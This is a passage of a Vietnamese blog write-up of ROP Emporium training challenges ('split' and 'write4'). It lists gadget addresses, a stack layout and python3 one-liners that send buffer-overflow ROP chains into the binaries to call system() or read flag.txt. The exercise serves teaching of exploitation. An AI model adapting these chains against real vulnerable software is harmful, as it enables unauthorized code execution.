<span class="w">  </span><span class="p">[</span><span class="mh">0x400560</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">system</span><span class="p">();</span><span class="w"></span>
</code></pre></div>

<p>Truyền payload vào binary</p>
<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import sys;sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;</span><span class="se">\xc3\x07\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x60\x10\x60\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x3e\x05\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x60\x05\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4)&quot;</span> <span class="o">|</span> <span class="o">./</span><span class="n">split</span>
</code></pre></div>

<h2>Write4</h2>
<p>Challenge 4 sẽ hướng dẫn một kỹ thuật chính là <strong>write-what-where gadgets,</strong> nơi ta sẽ ghi nội dung bất kỳ vào vị trí nào đó trong memory</p>
<p>Gadget này sẽ có dạng <code>mov [reg2], reg1</code> nơi ta sẽ ghi nội dung của thanh ghi reg1 vào địa chỉ lưu trong thanh ghi reg2</p>
<p>Ở bài này ta có sẵn function print_file(*arg1) nhận giá trị tại địa chỉ của arg1 và truyền vào hàm fopen và mở file đó ra, do đó ta cần khiến thanh ghi <code>rdi</code> lưu địa chỉ mà tại đó chứa tên chuỗi “flag.txt” là được</p>
<p><img alt="" src="./images/ropemporium/Write4/image.png"></p>
<p>Tiến hành lấy các gadget cần thiết</p>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">write4</span><span class="w"></span>
<span class="o">[</span><span class="n">Imports</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">4</span><span class="w">   </span><span class="mh">0x00400510</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">print_file</span><span class="w"></span>

<span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">write4</span><span class="w"></span>
<span class="o">[</span><span class="n">Sections</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">        </span><span class="k">size</span><span class="w"> </span><span class="n">vaddr</span><span class="w">       </span><span class="n">vsize</span><span class="w"> </span><span class="n">perm</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="mi">23</span><span class="w">  </span><span class="mh">0x00001028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="mh">0x00601028</span><span class="w">   </span><span class="mh">0x10</span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w"> </span><span class="p">.</span><span class="k">data</span><span class="w"></span>

<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">write4</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mh">0x0000000000400690</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r14</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span>
<span class="mh">0x0000000000400628</span><span class="err">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">r14</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="mh">0x0000000000400693</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span>
<span class="mh">0x00000000004004e6</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
</code></pre></div>

<p>Sử dụng gadget <code>pop r14; pop r15; ret;</code>  sẽ lấy lần lượt vị trí kế trong stack lưu vào r14 (địa chỉ vaddr của .data section vì nó có quyền ghi -rw-) và kế sau lưu vào r15 (chuỗi “flag.txt” vừa đủ 8 byte nên ta không cần thêm)</p>
<p>Sau đó ta gọi gadget <code>mov qword ptr [r14], r15; ret;</code> để lấy giá trị trong r15 lưu tại vị trí tại địa chỉ lưu trong r14 cũng chính là .data section.</p>
<p>Cuối cùng là truyền địa chỉ vào arg1 bằng gadget <code>pop rdi; ret;</code> với địa chỉ của .data section</p>
<p>Ta sẽ build stack như sau:</p>
<div class="highlight"><pre><span></span><code><span class="k">[A*8  ]</span><span class="w"></span>
<span class="k">[.....]</span><span class="w"></span>
<span class="na">[A*8  ] -&gt; 40*A</span><span class="w"></span>
<span class="na">[0x400690] -&gt; pop r14; pop r15; ret;</span><span class="w"></span>
<span class="na">[0x601028] -&gt; -rw- .data -&gt; r14</span><span class="w"></span>
<span class="na">[b&#39;flag.txt&#39;] -&gt; 8 byte &quot;flag.txt&quot; -&gt; r15</span><span class="w"></span>
<span class="na">[0x400628] -&gt; mov qword ptr [r14], r15; ret; -&gt; lấy &#39;flag.txt&#39; lưu vào .data</span><span class="w"></span>
<span class="na">[0x400693] -&gt; pop rdi; ret; -&gt; arg1</span><span class="w"></span>
<span class="na">[0x601028] -&gt; -rw- .data -&gt; địa chỉ lưu &#39;flag.txt&#39; -&gt; arg1</span><span class="w"></span>
<span class="na">[0x4004e6] -&gt; ret;</span><span class="w"></span>
<span class="na">[0x400510] -&gt; print_file(*rdi);</span><span class="w"></span>
</code></pre></div>

<p>Truyền payload vào binary</p>
<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import sys;sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;</span><span class="se">\x90\x06\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x28\x10\x60\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;flag.txt&#39; + b&#39;</span><span class="se">\x28\x06\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x93\x06\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x28\x10\x60\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\xe6\x04\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4 + b&#39;</span><span class="se">\x10\x05\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4)&quot;</span> <span class="o">|</span> <span class="o">./</span><span class="n">write4</span>
</code></pre></div>


             
 
            
            
            







            <hr/>
        </div>
        <section id="article-sidebar" class="span2">
            <h4>Published</h4>
            <time itemprop="dateCreated" datetime="2023-09-29T00:00:00+07:00">Fri 29 September 2023</time>
            <h4>Category</h4>
            <a class="category-link" href="./categories.html#trang-chu-ref">Trang chủ</a>
            <h4>Tags</h4>
            <ul class="list-of-tags tags-in-article">
                <li><a href="./tags.html#binary-ref">binary
                    <span class="superscript">2</span>
</a></li>
                <li><a href="./tags.html#exploit-ref">exploit
                    <span class="superscript">2</span>
</a></li>
                <li><a href="./tags.html#rop-ref">rop
                    <span class="superscript">2</span>
</a></li>
                <li><a href="./tags.html#x64-ref">x64
                    <span class="superscript">2</span>
</a></li>
            </ul>
<h4>Contact</h4>
<div id="sidebar-social-link">
</div>
            





            





        </section>
</div>
</article>
<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe.
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides.
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>                    </div>
                    <div class="span1"></div>
                </div>
            </div>
        </div>
<footer>




    <div id="fpowered">
        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
    </div>
</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
        <script src="./theme/js/elegant.prod.9e9d5ce754.js"></script>
        <script>
            function validateForm(query)
            {
                return (query.length > 0);
            }
        </script>

    <script>
    (function () {
        if (window.location.hash.match(/^#comment-\d+$/)) {
            $('#comment_thread').collapse('show');
        }
    })();
    window.onhashchange=function(){
        if (window.location.hash.match(/^#comment-\d+$/))
            window.location.reload(true);
    }
    $('#comment_thread').on('shown', function () {
        var link = document.getElementById('comment-accordion-toggle');
        var old_innerHTML = link.innerHTML;
        $(link).fadeOut(200, function() {
            $(this).text('Click here to hide comments').fadeIn(200);
        });
        $('#comment_thread').on('hidden', function () {
            $(link).fadeOut(200, function() {
                $(this).text(old_innerHTML).fadeIn(200);
            });
        })
    })
</script>

    </body>
    <!-- Theme: Elegant built for Pelican
        License : MIT -->
</html>